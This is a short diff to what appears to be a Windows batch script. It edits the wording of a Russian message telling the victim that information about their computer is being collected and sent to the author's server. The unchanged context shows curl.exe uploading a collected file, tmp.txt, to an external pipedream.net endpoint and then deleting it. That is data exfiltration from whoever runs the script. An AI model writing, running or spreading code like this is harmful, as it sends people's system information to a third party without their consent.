@@ -6,7 +6,7 @@ curl.exe -F --data=@tmp.txt https://f0dea6f9d3a33c246f89ed0e770012bd.m.pipedream
 
 del tmp.txt
 
-echo Не писий, щас соберется инфа про твой комп и прилетит ко мне на сервер, больше ничего не будет > mes.txt
+echo Не боись, щас соберется инфа про твой комп и прилетит ко мне на сервер, больше ничего не будет > mes.txt
 echo.>> mes.txt
 echo Закрой файл) >> mes.txt
 
